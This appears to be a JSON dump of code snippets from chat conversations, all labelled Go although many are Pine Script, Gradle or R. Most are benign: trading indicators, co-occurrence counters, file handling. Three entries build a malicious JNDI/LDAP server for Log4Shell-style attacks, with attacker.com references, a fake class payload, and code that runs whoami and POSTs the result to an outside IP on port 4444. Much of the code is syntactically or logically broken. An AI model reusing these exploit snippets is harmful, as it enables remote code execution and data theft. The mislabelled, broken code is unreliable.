    "code": "pine-script\n//@version=5\nindicator(\"Long Short Strategy\", overlay=true)\n\nlong_threshold = input.float(title=\"Long Threshold\", defval=0.05, minval=0, step=0.01)\nshort_threshold = input.float(title=\"Short Threshold\", defval=0.05, minval=0, step=0.01)\nstop_loss = input.float(title=\"Stop Loss\", defval=0.01, minval=0, step=0.01)\ntake_profit = input.float(title=\"Take Profit\", defval=0.01, minval=0, step=0.01)\n\n// Calculate 20-period rolling mean of close price\nrolling_mean = ta.sma(close, 20)\n\n// Define initial variables\nposition = 0\nbuy_price = 0\nreturns = 0\n\n// Loop through the bars\nfor i = 0 to bar_index\n    // Determine long or short entry\n    if close[i] > rolling_mean[i] * (1 + long_threshold) and position == 0\n        position := 1\n        buy_price := close[i]\n    else if close[i] < rolling_mean[i] * (1 - short_threshold) and position == 0\n        position := -1\n        buy_price := close[i]\n    \n    // Determine exit conditions\n    if position == 1 and close[i] <= buy_price * (1 - stop_loss)\n        returns += buy_price * (1 - stop_loss) - buy_price\n        position := 0\n    else if position == -1 and close[i] >= buy_price * (1 + take_profit)\n        returns += buy_price * (1 + take_profit) - buy_price\n        position := 0\n\n// Output the results\nplot(returns, title=\"Returns\")",
    "filename": "2c39241821c0eabcf8e76e27e3a87faf_1.go"
  },
  {
    "conversation_hash": "6fe635a2331ebd2211a769996a3bcb1a",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"context\"\n    \"flag\"\n    \"fmt\"\n    \"\"github.com/apache/beam/sdks/go/pkg/beam\"\n    \"github.com/apache/beam/sdks/go/pkg/beam/io/textio\"\n    \"github.com/apache/beam/sdks/go/pkg/beam/transforms/stats\"\n    \"github.com/apache/beam/sdks/go/pkg/beam/x/beamx\"\n    \"strings\"\n)\n\nfunc main() {\n    // Définition des arguments en ligne de commande.\n    input := flag.String(\"input\", \"\", \"Chemin du fichier d'entrée\")\n    output := flag.String(\"output\", \"\", \"Chemin du fichier de sortie\")\n\n    flag.Parse()\n    beam.Init()\n\n    // Création d'une pipeline Beam.\n    p := beam.NewPipeline()\n    s := p.Root()\n\n    // Lecture du fichier texte d'entrée.\n    lines := textio.Read(s, *input)\n\n    // Transformation de chaque ligne en tableau de mots.\n    // Vous pouvez adapter cela en fonction de votre format de fichier.\n    words := beam.ParDo(s, func(line string, emit func(string)) {\n        emit(strings.Fields(line))\n    }, lines)\n\n    // Création d'une matrice de cooccurrence.\n    matrix := stats.CoOccur(s, words, stats.CoOccurKeepAll())\n\n    // Écriture de la matrice de cooccurrence dans un fichier texte de sortie.\n    textio.Write(s, *output, beam.ParDo(s, func(kv KV, emit func(string)) {\n        emit(fmt.Sprintf(\"%s,%s,%d\", kv.word1, kv.word2, kv.count))\n    }, matrix))\n\n    // Lancement de la pipeline Beam.\n    if err := beamx.Run(context.Background(), p); err != nil {\n        panic(err)\n    }\n}\n\n// Définition de la structure KeyValue pour stocker les deux mots associés et leur compteur.\ntype KV struct {\n    word1 string\n    word2 string\n    count int\n}",
    "filename": "6fe635a2331ebd2211a769996a3bcb1a_0.go"
  },
  {
    "conversation_hash": "6fe635a2331ebd2211a769996a3bcb1a",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"bufio\"\n\t\"context\"\n\t\"flag\"\n\t\"fmt\"\n\t\"log\"\n\t\"os\"\n\t\"strings\"\n)\n\nfunc main() {\n\t// Définition des arguments en ligne de commande.\n\tinput := flag.String(\"input\", \"\", \"Chemin du fichier d'entrée\")\n\toutput := flag.String(\"output\", \"\", \"Chemin du fichier de sortie\")\n\n\tflag.Parse()\n\n\t// Ouverture du fichier d'entrée.\n\tfile, err := os.Open(*input)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tdefer file.Close()\n\n\t// Création d'un scanner pour lire le fichier ligne par ligne.\n\tscanner := bufio.NewScanner(file)\n\n\t// Création d'une map pour stocker la matrice de cooccurrence.\n\tmatrix := make(map[string]map[string]int)\n\n\t// Lecture et traitement de chaque ligne du fichier.\n\tfor scanner.Scan() {\n\t\tline := scanner.Text()\n\t\twords := strings.Fields(line)\n\n\t\t// Parcours de tous les mots de la ligne.\n\t\tfor i, word1 := range words {\n\t\t\t// Parcours des mots suivants.\n\t\t\tfor _, word2 := range words[i+1:] {\n\t\t\t\t// Mise à jour de la matrice de cooccurrence.\n\t\t\t\tif _, ok := matrix[word1]; !ok {\n\t\t\t\t\tmatrix[word1] = make(map[string]int)\n\t\t\t\t}\n\t\t\t\tmatrix[word1][word2]++\n\t\t\t}\n\t\t}\n\t}\n\n\t// Vérification d'éventuelles erreurs lors de la lecture du fichier.\n\tif err := scanner.Err(); err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\t// Écriture de la matrice de cooccurrence dans un fichier texte de sortie.\n\toutputFile, err := os.Create(*output)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tdefer outputFile.Close()\n\n\twriter := bufio.NewWriter(outputFile)\n\n\tfor word1, counts := range matrix {\n\t\tfor word2, count := range counts {\n\t\t\twriter.WriteString(fmt.Sprintf(\"%s,%s,%d\\n\", word1, word2, count))\n\t\t}\n\t}\n\n\twriter.Flush()\n\t\n\t// Affichage de la confirmation de la fin du traitement.\n\tfmt.Println(\"Terminé !\")\n}",
    "filename": "6fe635a2331ebd2211a769996a3bcb1a_1.go"
  },
  {
    "conversation_hash": "6fe635a2331ebd2211a769996a3bcb1a",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"bufio\"\n    \"context\"\n    \"flag\"\n    \"fmt\"\n    \"log\"\n    \"os\"\n    \"strings\"\n\n    \"github.com/go-redis/redis\"\n)\n\nfunc main() {\n    // Définition des arguments en ligne de commande.\n    input := flag.String(\"input\", \"\", \"Chemin du fichier d'entrée\")\n    host := flag.String(\"host\", \"\", \"Adresse du serveur Redis\")\n    port := flag.String(\"port\", \"\", \"Port du serveur Redis\")\n    password := flag.String(\"password\", \"\", \"Mot de passe du serveur Redis\")\n\n    flag.Parse()\n\n    // Création du client Redis.\n    client := redis.NewClient(&redis.Options{\n        Addr:     fmt.Sprintf(\"%s:%s\", *host, *port),\n        Password: *password,\n        DB:       0,\n    })\n\n    // Ouverture du fichier d'entrée.\n    file, err := os.Open(*input)\n    if err != nil {\n        log.Fatal(err)\n    }\n    defer file.Close()\n\n    // Création d'un scanner pour lire le fichier ligne par ligne.\n    scanner := bufio.NewScanner(file)\n\n    // Création d'une map pour stocker la matrice de cooccurrence.\n    matrix := make(map[string]map[string]int)\n\n    // Lecture et traitement de chaque ligne du fichier.\n    for scanner.Scan() {\n        line := scanner.Text()\n        words := strings.Fields(line)\n\n        // Parcours de tous les mots de la ligne.\n        for i, word1 := range words {\n            // Parcours des mots suivants.\n            for _, word2 := range words[i+1:] {\n                // Mise à jour de la matrice de cooccurrence.\n                if _, ok := matrix[word1]; !ok {\n                    matrix[word1] = make(map[string]int)\n                }\n                matrix[word1][word2]++\n            }\n        }\n    }\n\n    // Vérification d'éventuelles erreurs lors de la lecture du fichier.\n    if err := scanner.Err(); err != nil {\n        log.Fatal(err)\n    }\n\n    // Écriture de la matrice de cooccurrence dans Redis.\n    for word1, counts := range matrix {\n        for word2, count := range counts {\n            key := fmt.Sprintf(\"%s:%s\", word1, word2)\n            client.Set(key, count, 0)\n        }\n    }\n\n    // Affichage de la confirmation de la fin du traitement.\n    fmt.Println(\"Terminé !\")\n}",
    "filename": "6fe635a2331ebd2211a769996a3bcb1a_2.go"
  },
  {
    "conversation_hash": "a95a083929e481858af51b5df4f964c9",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "buildscript {\n    ext {\n        ...\n        compose_version = '1.4.3'\n    }\n    ...\n}",
    "filename": "a95a083929e481858af51b5df4f964c9_2.go"
  },
  {
    "conversation_hash": "8e0fa4ac2a95d6c3ae96b17d9b031d5b",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "plugins {\n    id 'com.android.application'\n    id 'org.jetbrains.kotlin.android'\n}\n\nandroid {\n    compileSdk 33\n\n    defaultConfig {\n        applicationId \"com.example.musicapp\"\n        minSdk 24\n        targetSdk 33\n        versionCode 1\n        versionName \"1.0\"\n\n        testInstrumentationRunner \"androidx.test.runner.AndroidJUnitRunner\"\n\n        vectorDrawables.useSupportLibrary = true\n    }\n\n    buildTypes {\n        release {\n            minifyEnabled false\n            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'\n        }\n    }\n\n    compileOptions {\n        sourceCompatibility JavaVersion.VERSION_1_8\n        targetCompatibility JavaVersion.VERSION_1_8\n    }\n\n    kotlinOptions {\n        jvmTarget = '1.8'\n    }\n\n    buildFeatures {\n        compose true\n    }\n\n    composeOptions {\n        kotlinCompilerVersion '1.5.21'\n        kotlinCompilerExtensionVersion '1.2.0'\n    }\n\n    packagingOptions {\n        resources {\n            excludes += '/META-INF/{AL2.0,LGPL2.1}'\n        }\n    }\n}\n\ndef compose_version = '1.4.3'\n\ndependencies {\n    implementation 'androidx.core:core-ktx:1.10.0'\n    implementation 'androidx.appcompat:appcompat:1.4.1'\n    implementation 'com.google.android.material:material:1.6.0'\n    implementation 'org.jetbrains.kotlin:kotlin-stdlib:1.7.0'\n    implementation 'androidx.lifecycle:lifecycle-livedata-ktx:2.6.1'\n    implementation 'androidx.lifecycle:lifecycle-viewmodel-ktx:2.6.1'\n    implementation 'androidx.activity:activity-compose:1.5.0'\n    implementation \"androidx.compose.ui:ui:$compose_version\"\n    implementation \"androidx.compose.ui:ui-tooling:$compose_version\"\n    implementation \"androidx.compose.ui:ui-tooling-preview:$compose_version\"\n    implementation \"androidx.compose.foundation:foundation:$compose_version\"\n    implementation 'androidx.compose.material:material:1.4.3'\n    implementation 'androidx.constraintlayout:constraintlayout:2.1.3'\n    testImplementation 'junit:junit:4.12'\n    androidTestImplementation 'androidx.test.ext:junit:1.1.3'\n    androidTestImplementation 'androidx.test.espresso:espresso-core:3.4.0'\n}",
    "filename": "8e0fa4ac2a95d6c3ae96b17d9b031d5b_0.go"
  },
  {
    "conversation_hash": "46d9d5f7d8b094813b4c9103ccd14bee",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "repositories {\n    google()\n    jcenter()\n    mavenCentral()\n}",
    "filename": "46d9d5f7d8b094813b4c9103ccd14bee_0.go"
  },
  {
    "conversation_hash": "dd37f237cda1b855d0f7a67d88f3cc7a",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"path/filepath\"\n)\n\nfunc main() {\n\tpath := \"a/b/c.pdf\"\n\tfilename := filepath.Base(path)\n\tfmt.Println(filename)\n}",
    "filename": "dd37f237cda1b855d0f7a67d88f3cc7a_1.go"
  },
  {
    "conversation_hash": "0e7f9d02bdb9304d4318f4f2e65bfe2f",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "//@version=4\nstudy(title=\"Zigzag Indicator\", shorttitle=\"Zigzag\", format=format.price, precision=2, resolution=\"\")\nlen = input(title='Length', defval=10)\ndev = input(title='Deviation', defval=1)\nbackstep = input(title='Backstep', defval=5)\nsource = input(close, title='Source')\n\nvar lastHigh = 0.0\nvar lastLow = 0.0\nvar lastHHBar = 0\nvar lastLLBar = 0\nvar lastDirectionUp = true\n\nzigzag(bar_source, len, dev, backstep) =>\n    currentDirectionUp = lastHigh <= lastLow\n    currentExtreme = currentDirectionUp ? lastLow : lastHigh\n    extremeBar = currentDirectionUp ? lastLLBar : lastHHBar\n    newExtreme = bar_source - currentExtreme >= dev * syminfo.mintick\n    newExtreme |= extremeBar == 0\n    newExtreme |= extremeBar + backstep >= bar_index\n    if newExtreme\n        if currentDirectionUp\n            lastLow := bar_source\n            lastLLBar := bar_index\n        else\n            lastHigh := bar_source\n            lastHHBar := bar_index\n    lastDirectionUp := currentDirectionUp\n    currentExtreme\n\nzigzag(source, len, dev, backstep)\nplot(lastDirectionUp ? lastLow : lastHigh, color=color.green, style=plot.style_linebr, title='Zigzag')",
    "filename": "0e7f9d02bdb9304d4318f4f2e65bfe2f_0.go"
  },
  {
    "conversation_hash": "0e7f9d02bdb9304d4318f4f2e65bfe2f",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "//@version=4\nstudy(title='Zigzag Indicator', shorttitle='Zigzag', group='Higher High-Lower Low / ZIGZAG')\n\ndepth=input(title='Depth', defval=80, group='Higher High-Lower Low / ZIGZAG')\ndeviation=input(title='Deviation', defval=1, minval=1, step=1, group='Higher High-Lower Low / ZIGZAG')\nbackstep=input(title='Backstep', defval=5, group='Higher High-Lower Low / ZIGZAG')\non=input(title='HH-LL / ZIGZAG', defval=true, group='Higher High-Lower Low / ZIGZAG')\n\nlastHigh=0.0\nlastLow=0.0\nlastHighBar=0\nlastLowBar=0\nlastDirectionIsUp=true\n\nzigzag(source, len, deviation, backstep)=>\n    var lastSwing = 0.0\n    var lastSwingBar = 0\n    var newHigh = 0.0\n    var newLow = 0.0\n    \n    isSwingHigh = source > lastSwing[1] and source >= lastSwingBar or (lastDirectionIsUp and lastSwingBar != 0 and lastSwing[1] - source > deviation * syminfo.mintick)\n    isSwingLow = source < lastSwing[1] and source <= lastSwingBar or (not lastDirectionIsUp and lastSwingBar != 0 and source - lastSwing[1] > deviation * syminfo.mintick)\n    \n    lastSwing := isSwingHigh ? source : lastSwing[1]\n    lastSwing := isSwingLow ? source : lastSwing[1]\n    lastSwingBar := isSwingHigh or isSwingLow ? bar_index : lastSwingBar\n    newHigh := isSwingHigh ? lastSwing : newHigh\n    newLow := isSwingLow ? lastSwing : newLow\n    \n    [newHigh, newLow, lastSwingBar, lastSwing]\n\n[HH, LL, bar, price] = security(syminfo.tickerid, timeframe.period, zigzag(source, depth, deviation, backstep))\n\nplot(zigzag(on ? HH : na, on ? LL : na)[0], color=color.green, style=plot.style_stepline)\n\nvar line zz=label.new(na,na,\"\",color=color.white), label rs=label.new(na,na,\"\",color=color.white), label sp=label.new(na,na,\"\",color=color.white)\nvar string text=\"\"\nif bar!=bar[1]\n    if lastDirectionIsUp?low[bar[1]]<=price:high[bar[1]]>=price\n        lastDirectionIsUp:=not lastDirectionIsUp\n    HH:=lastDirectionIsUp?HH:price\n    LL:=lastDirectionIsUp?price:LL\nif on\n    if not na(zz)\n        label.delete(rs)\n        label.delete(sp)\n        label.set_xy(zz, bar_index, price)\n    else\n        zz:=label.new(bar_index,price,text,color=color.white)",
    "filename": "0e7f9d02bdb9304d4318f4f2e65bfe2f_1.go"
  },
  {
    "conversation_hash": "1f7b1db540fbd99d87ba26e427920099",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "url := \"10.33.60.231:30799/ibkthirdapi/ncc/withdraw/add\"\nencodedURL := \"http://\" + url.PathEscape(url)\nparsedURL, err := url.Parse(encodedURL)\nif err != nil {\n    // 处理解析错误\n}",
    "filename": "1f7b1db540fbd99d87ba26e427920099_2.go"
  },
  {
    "conversation_hash": "1f7b1db540fbd99d87ba26e427920099",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "urlStr := \"http://www.sobot.com/console/login\"\nencodedUrlStr := url.QueryEscape(urlStr)\nparsedUrl, err := url.Parse(encodedUrlStr)\nif err != nil {\n    // 处理解析错误\n}",
    "filename": "1f7b1db540fbd99d87ba26e427920099_3.go"
  },
  {
    "conversation_hash": "1f7b1db540fbd99d87ba26e427920099",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "import (\n    \"fmt\"\n    \"regexp\"\n)\n\nfunc main() {\n    pattern := `^(?:[0-9]{1,3}\\.){3}[0-9]{1,3}$`  // IP地址的正则表达式\n    str := \"192.168.1.1\"\n    matched, err := regexp.MatchString(pattern, str)\n    if err != nil {\n        // 处理错误\n    }\n    if matched {\n        fmt.Printf(\"%s is an IP address\\n\", str)\n    } else {\n        fmt.Printf(\"%s is not an IP address\\n\", str)\n    }\n}",
    "filename": "1f7b1db540fbd99d87ba26e427920099_4.go"
  },
  {
    "conversation_hash": "5c0708944c8f0a8508ad15c388f04f14",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"github.com/vitali-fedulov/go-ldap-server\"\n)\n\nfunc main() {\n    // 创建一个JNDI Server\n    server := ldap.NewServer()\n\n    // 配置JNDI Server\n    server.BindFunc(\"\", func(bindDN, bindSimplePw string, conn net.Conn) (ldap.Binder, error) {\n        if bindDN == \"cn=admin,dc=mycompany,dc=com\" && bindSimplePw == \"secret\" {\n            return ldap.SimpleBind(bindDN, bindSimplePw, conn)\n        }\n        return nil, ldap.ErrInvalidCredentials\n    })\n\n    // 运行JNDI Server\n    err := server.ListenAndServe(\"localhost:1389\")\n    if err != nil {\n        log.Fatalf(\"Failed to start server: %s\", err.Error())\n    }\n}",
    "filename": "5c0708944c8f0a8508ad15c388f04f14_0.go"
  },
  {
    "conversation_hash": "5c0708944c8f0a8508ad15c388f04f14",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"fmt\"\n    \"log\"\n    \"net\"\n\n    \"github.com/vitali-fedulov/go-ldap-server\"\n)\n\nfunc main() {\n    // 创建一个JNDI Server\n    server := ldap.NewServer()\n\n    // 配置JNDI Server\n    server.BindFunc(\"\", func(bindDN, bindSimplePw string, conn net.Conn) (ldap.Binder, error) {\n        if bindDN == \"cn=admin,dc=mycompany,dc=com\" && bindSimplePw == \"secret\" {\n            return ldap.SimpleBind(bindDN, bindSimplePw, conn)\n        }\n        return nil, ldap.ErrInvalidCredentials\n    })\n\n    // 植入恶意类文件\n    server.AddFunc(\"uid=attacker,ou=People,dc=mycompany,dc=com\", func(req *ldap.Request, conn net.Conn) {\n        // 执行whoami命令\n        resp := ldap.NewSearchResultDoneResponse(ldap.LDAPResultSuccess)\n        resp.Entries = []*ldap.Entry{&ldap.Entry{\n            DN: \"uid=attacker,ou=People,dc=mycompany,dc=com\",\n            Attributes: []*ldap.EntryAttribute{\n                &ldap.EntryAttribute{\n                    Name: \"javaClassName\",\n                    Values: []string{\"com.sun.rowset.JdbcRowSetImpl\"},\n                },\n                &ldap.EntryAttribute{\n                    Name: \"dataSourceName\",\n                    Values: []string{fmt.Sprintf(\"ldap://%s/Exploit\", req.Conn.RemoteAddr().String())},\n                },\n                &ldap.EntryAttribute{\n                    Name: \"databaseName\",\n                    Values: []string{\"http://attacker.com\"},\n                },\n                &ldap.EntryAttribute{\n                    Name: \"url\",\n                    Values: []string{\"http://attacker.com\"},\n                },\n                &ldap.EntryAttribute{\n                    Name: \"user\",\n                    Values: []string{\"bogus\"},\n                },\n                &ldap.EntryAttribute{\n                    Name: \"password\",\n                    Values: []string{\"bogus\"},\n                },\n            },\n        }}\n        err := conn.Write(resp.Encode())\n        if err != nil {\n            log.Fatalf(\"Failed to send response: %s\", err.Error())\n        }\n    })\n\n    // 运行JNDI Server\n    err := server.ListenAndServe(\"localhost:1389\")\n    if err != nil {\n        log.Fatalf(\"Failed to start server: %s\", err.Error())\n    }\n}",
    "filename": "5c0708944c8f0a8508ad15c388f04f14_1.go"
  },
  {
    "conversation_hash": "5c0708944c8f0a8508ad15c388f04f14",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"bytes\"\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"log\"\n\t\"net\"\n\t\"net/http\"\n\t\"net/url\"\n\t\"os/exec\"\n\n\t\"github.com/vitali-fedulov/go-ldap-server\"\n)\n\nfunc main() {\n\t// 创建一个JNDI Server\n\tserver := ldap.NewServer()\n\n\t// 配置JNDI Server\n\tserver.BindFunc(\"\", func(bindDN, bindSimplePw string, conn net.Conn) (ldap.Binder, error) {\n\t\tif bindDN == \"cn=admin,dc=mycompany,dc=com\" && bindSimplePw == \"secret\" {\n\t\t\treturn ldap.SimpleBind(bindDN, bindSimplePw, conn)\n\t\t}\n\t\treturn nil, ldap.ErrInvalidCredentials\n\t})\n\n\t// 添加恶意条目\n\tserver.AddFunc(\"ldap://localhost:1389/Exploit\", func(req *ldap.Request, conn net.Conn) {\n\t\t// 恶意类文件的字节码（用于触发漏洞）\n\t\tclassBytes := []byte(\"\\xCA\\xFE\\xBA\\xBE\\x00\\x00\\x00\\x34\\x00\\x32\\x0A\\x00\\x0B\\x00\\x3A\\x09\\x00\\x3B\\x09\\x00\\x3C\\x08\\x00\\x3D\\x07\\x00\\x3E\\x0A\\x00\\x3F\\x00\\x0A\\x0A\\x00\")\n\t\tpayload := bytes.NewBuffer(classBytes).Bytes()\n\n\t\t// 执行whoami，并将结果发送到指定的IP地址和端口\n\t\tcmd := exec.Command(\"cmd.exe\", \"/c\", \"whoami\")\n\t\tstdout, err := cmd.Output()\n\t\tif err != nil {\n\t\t\tlog.Fatalf(\"Failed to execute command: %s\", err.Error())\n\t\t}\n\t\tresult := string(stdout)\n\t\tdata := url.Values{\"result\": {result}}\n\t\tresp, err := http.PostForm(\"http://10.66.119.40:4444\", data)\n\t\tif err != nil {\n\t\t\tlog.Fatalf(\"Failed to send result: %s\", err.Error())\n\t\t}\n\t\tdefer resp.Body.Close()\n\t\tb, err := ioutil.ReadAll(resp.Body)\n\t\tif err != nil {\n\t\t\tlog.Fatalf(\"Failed to read response: %s\", err.Error())\n\t\t}\n\n\t\t// 设置JNDI返回结果\n\t\tresp2 := ldap.NewSearchResultDoneResponse(ldap.LDAPResultSuccess)\n\t\tresp2.Entries = []*ldap.Entry{&ldap.Entry{\n\t\t\tDN: \"uid=attacker,ou=People,dc=mycompany,dc=com\",\n\t\t\tAttributes: []*ldap.EntryAttribute{\n\t\t\t\t&ldap.EntryAttribute{\n\t\t\t\t\tName: \"javaClassName\",\n\t\t\t\t\tValues: []string{\"com.sun.rowset.JdbcRowSetImpl\"},\n\t\t\t\t},\n\t\t\t\t&ldap.EntryAttribute{\n\t\t\t\t\tName: \"dataSourceName\",\n\t\t\t\t\tValues: []string{fmt.Sprintf(\"ldap://%s:%d/Exploit\", req.Conn.RemoteAddr().String(), req.Conn.LocalAddr().(*net.TCPAddr).Port)},\n\t\t\t\t},\n\t\t\t\t&ldap.EntryAttribute{\n\t\t\t\t\tName: \"databaseName\",\n\t\t\t\t\tValues: []string{\"some-database\"},\n\t\t\t\t},\n\t\t\t\t&ldap.EntryAttribute{\n\t\t\t\t\tName: \"url\",\n\t\t\t\t\tValues: []string{\"http://attacker.com\"},\n\t\t\t\t},\n\t\t\t\t&ldap.EntryAttribute{\n\t\t\t\t\tName: \"user\",\n\t\t\t\t\tValues: []string{\"attacker\"},\n\t\t\t\t},\n\t\t\t\t&ldap.EntryAttribute{\n\t\t\t\t\tName: \"password\",\n\t\t\t\t\tValues: []string{\"attacker\"},\n\t\t\t\t},\n\t\t\t\t&ldap.EntryAttribute{\n\t\t\t\t\tName: \"objectPayload\",\n\t\t\t\t\tValues: []string{string(payload)},\n\t\t\t\t},\n\t\t\t\t&ldap.EntryAttribute{\n\t\t\t\t\tName: \"javaSerializedData\",\n\t\t\t\t\tValues: []string{string(b)},\n\t\t\t\t},\n\t\t\t},\n\t\t}}\n\t\terr = conn.Write(resp2.Encode())\n\t\tif err != nil {\n\t\t\tlog.Fatalf(\"Failed to send response: %s\", err.Error())\n\t\t}\n\t})\n\n\t// 运行JNDI Server\n\terr := server.ListenAndServe(\"localhost:1389\")\n\tif err != nil {\n\t\tlog.Fatalf(\"Failed to start server: %s\", err.Error())\n\t}\n}",
    "filename": "5c0708944c8f0a8508ad15c388f04f14_3.go"
  },
  {
    "conversation_hash": "a38e622105c8dfb50c4f13ac78158093",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "#10.3 Replace original standard errors with the robust ones\nfor (i in seq_along(pre_covid_var*varresult)) {\n  pre_covid_var_robust*varresult[[i]]*coefficients[, 2] <- pre_covid_robust_se\n}\nfor (i in seq_along(covid_period_var*varresult)) {\n  covid_period_var_robust*varresult[[i]]*coefficients[, 2] <- covid_period_robust_se\n}\nfor (i in seq_along(war_period_var*varresult)) {\n  war_period_var_robust*varresult[[i]]*coefficients[, 2] <- war_period_robust_se\n}\nfor (i in seq_along(overall_period_var*varresult)) {\n  overall_period_var_robust*varresult[[i]]*coefficients[, 2] <- overall_period_robust_se\n}\n\n#10.4 Now you can view the results with robust standard errors\nsummary(pre_covid_var_robust)\nsummary(covid_period_var_robust)\nsummary(war_period_var_robust)\nsummary(overall_period_var_robust)",
    "filename": "a38e622105c8dfb50c4f13ac78158093_0.go"
  },
  {
    "conversation_hash": "5fc6bf26b8859f525cb61e38348697b4",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "func (f *Fuzzer) HandleResponse(ctx *Context, r *http.Response) error {\n    body, err := ioutil.ReadAll(r.Body)\n    if err != nil {\n        log.Fatal(err)\n    }\n    fmt.Println(string(body))\n    return nil\n}",
    "filename": "5fc6bf26b8859f525cb61e38348697b4_1.go"
  },
  {
    "conversation_hash": "5fc6bf26b8859f525cb61e38348697b4",
    "code_index": 6,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"encoding/json\"\n    \"fmt\"\n    \"os\"\n)\n\ntype Person struct {\n    Name string `json:\"name\"`\n    Age  int    `json:\"age\"`\n}\n\nfunc main() {\n    // 创建一个Person类型的结构体对象\n    p1 := Person{Name: \"Alice\", Age: 30}\n\n    // 打开一个JSON文件，如果不存在则创建\n    file, err := os.Create(\"person.json\")\n    if err != nil {\n        fmt.Println(\"Failed to create file:\", err)\n        return\n    }\n    defer file.Close()\n\n    // 将结构体对象编码为JSON格式并写入文件\n    encoder := json.NewEncoder(file)\n    err = encoder.Encode(p1)\n    if err != nil {\n        fmt.Println(\"JSON encoding error:\", err)\n        return\n    }\n    fmt.Println(\"person.json file created successfully!\")\n}",
    "filename": "5fc6bf26b8859f525cb61e38348697b4_6.go"
  },
  {
    "conversation_hash": "5fc6bf26b8859f525cb61e38348697b4",
    "code_index": 7,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"fmt\"\n    \"os\"\n    \"sync\"\n)\n\ntype FileData struct {\n    FileName string\n    Content  string\n}\n\nfunc main() {\n    // 创建一个用于接收文件数据的 channel\n    fileDataChan := make(chan FileData)\n\n    // 使用 WaitGroup 来等待所有 goroutine 完成写文件操作\n    var wg sync.WaitGroup\n\n    // 启动 10 个写文件的 goroutine\n    for i := 0; i < 10; i++ {\n        wg.Add(1)\n        go func() {\n            defer wg.Done()\n\n            // 从 channel 中取出文件数据并写入文件\n            for fileData := range fileDataChan {\n                file, err := os.Create(fileData.FileName)\n                if err != nil {\n                    fmt.Println(\"Failed to create file:\", err)\n                    continue\n                }\n                defer file.Close()\n\n                _, err = file.WriteString(fileData.Content)\n                if err != nil {\n                    fmt.Println(\"Failed to write data to file:\", err)\n                }\n            }\n        }()\n    }\n\n    // 向 channel 中发送文件数据\n    for i := 0; i < 100; i++ {\n        fileData := FileData{\n            FileName: fmt.Sprintf(\"file%d.txt\", i),\n            Content:  fmt.Sprintf(\"File #%d\\n\", i),\n        }\n        fileDataChan <- fileData\n    }\n\n    // 关闭 channel，并等待所有 goroutine 完成写文件操作\n    close(fileDataChan)\n    wg.Wait()\n\n    fmt.Println(\"All files written successfully!\")\n}",
    "filename": "5fc6bf26b8859f525cb61e38348697b4_7.go"
  },
  {
    "conversation_hash": "5fc6bf26b8859f525cb61e38348697b4",
    "code_index": 8,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"encoding/json\"\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"sync\"\n\t\"time\"\n)\n\ntype Record struct {\n\tTarGetMachineIp string    `json:\"tarGetMachineIp\"`\n\tRespContent     string    `json:\"respContent\"`\n\tTime            time.Time `json:\"time\"`\n}\n\ntype Records struct {\n\tRecordList []Record `json:\"records\"`\n}\n\nfunc main() {\n\n\t// 加载JSON文件\n\tdata, err := ioutil.ReadFile(\"1.json\")\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\tvar records Records\n\tif err := json.Unmarshal(data, &records); err != nil {\n\t\tpanic(err)\n\t}\n\n\t// 创建一个用于保护 RecordList 的锁\n\tvar mu sync.Mutex\n\n\t// 启动 10 个 goroutine 并发读取数据\n\tfor i := 0; i < 10; i++ {\n\t\tgo func() {\n\t\t\tfor _, record := range records.RecordList {\n\t\t\t\t// 加锁读取 RecordList 中的数据\n\t\t\t\tmu.Lock()\n\t\t\t\tfmt.Printf(\"%v: Machine %v => %v\\n\", record.Time, record.TarGetMachineIp, record.RespContent)\n\t\t\t\tmu.Unlock()\n\t\t\t}\n\t\t}()\n\t}\n\n\t// 等待所有 goroutine 完成\n\ttime.Sleep(time.Second * 2)\n}",
    "filename": "5fc6bf26b8859f525cb61e38348697b4_8.go"
  },
  {
    "conversation_hash": "4bf094774cd64ca2ac6889d8ea595ab3",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "type MyFile struct {\n    rwMutex  sync.RWMutex\n    filename string\n    data     Record\n}\n\nfunc (f *MyFile) Write(data Record) error {\n    f.rwMutex.Lock()\n    defer f.rwMutex.Unlock()\n\n    // 写入文件\n}\n\nfunc (f *MyFile) Read() (Record, error) {\n    f.rwMutex.RLock()\n    defer f.rwMutex.RUnlock()\n\n    // 读取文件\n}",
    "filename": "4bf094774cd64ca2ac6889d8ea595ab3_0.go"
  },
  {
    "conversation_hash": "4bf094774cd64ca2ac6889d8ea595ab3",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
